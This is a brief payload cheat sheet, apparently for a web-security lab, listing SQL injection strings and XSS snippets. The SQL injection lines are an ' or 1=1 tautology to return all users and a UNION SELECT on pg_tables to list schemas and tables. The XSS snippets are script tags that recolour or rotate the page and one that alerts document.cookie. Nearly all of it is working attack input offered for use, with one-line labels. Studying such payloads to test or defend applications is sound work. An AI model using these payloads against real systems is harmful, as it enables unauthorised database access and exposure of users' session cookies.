SQL INJECTION
-
//Use this to get all users
---
' or 1=1

//Use this to get the information about users and all the databases and their tables
---
' or 1=1 UNION SELECT null  AS id, schemaname as name, tablename as email, tableowner as password FROM pg_tables where '1' ='1


XSS
-
Change background
---
<script>
document.body.style.backgroundColor = "red";
</script>

Print Cookie
----
<script>
alert( document.cookie );
</script>


Rotate
---
<script>
document.body.style.transform = "rotate(45deg)";
</script>
